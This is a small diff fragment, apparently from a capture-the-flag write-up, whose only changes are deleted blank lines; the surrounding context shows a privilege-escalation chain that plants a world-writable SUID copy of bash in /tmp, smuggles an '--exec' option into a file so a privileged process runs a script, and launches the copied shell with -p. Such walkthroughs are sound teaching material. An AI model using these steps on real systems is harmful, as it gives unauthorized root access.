@@ -317,7 +317,6 @@ cat /dev/shm/0xdf.sh
 #!/bin/bash
 cp /bin/bash /tmp/0xdf
 chmod 4777 /tmp/0xdf
-
 ```
 
 Creating product.
@@ -328,7 +327,6 @@ echo '0xdf --exec="!/dev/shm/0xdf.sh"' >> 223.txt
 Calling it.
 ```
 item=223&user=0559-c1cd-524-cfcf&action=add_item
-
 
 /tmp/0xdf -p
 ```
